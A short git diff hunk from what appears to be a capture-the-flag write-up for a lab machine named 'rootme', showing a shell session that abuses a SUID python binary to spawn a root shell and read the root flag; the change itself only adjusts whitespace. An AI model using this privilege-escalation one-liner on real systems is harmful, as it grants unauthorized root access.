@@ -128,7 +128,8 @@ So there is a SUID set for python as root, lets exploit it.Check [GTFOBins](http
 
 ```bash
 www-data@rootme:/$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
-# python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+ # python3 -c 'import pty;pty.spawn("/bin/bash")'
 root@rootme:/# whoami
 root
 root@rootme:/# cat /root/root.txt
